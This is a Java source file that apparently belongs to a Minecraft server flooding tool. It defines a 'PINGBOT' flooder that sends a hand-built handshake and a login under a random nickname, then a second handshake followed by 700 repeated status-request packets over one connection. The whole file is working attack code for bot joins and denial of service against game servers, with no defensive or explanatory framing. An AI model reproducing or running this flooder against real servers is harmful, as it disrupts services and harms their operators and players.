package ping;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import ping.RandomNick;

import javax.xml.crypto.Data;

public class JoinMode
{
    public static int LOOP_AMOUNT = 700;
    private final Map<String, Flooder> flood = new HashMap<String, Flooder>();

    public JoinMode()
    {
        this.flood.put("PINGBOT", (out, host, port) -> {
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.writeBytes("localhost");
            out.write(200);
            out.write(230);
            out.write(2);
            String nick = RandomNick.randomString(9);
            out.write(nick.length() + 2);
            out.write(0);
            out.write(nick.length());
            out.writeBytes(nick);
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.writeBytes("localhost");
            out.write(200);
            out.write(230);
            out.write(1);
            for (int i = 0; i < LOOP_AMOUNT; i++)
            {
                out.write(1);
                out.write(0);
            }
        });
    }

    public Set<String> getFlood()
    {
        return new HashSet<String>(this.flood.keySet());
    }

    public Flooder findById(String id)
    {
        return this.flood.get(id);
    }

    @FunctionalInterface
    public static interface Flooder
    {
        public void flood(DataOutputStream v1, String v2, int var3) throws IOException;
    }
}
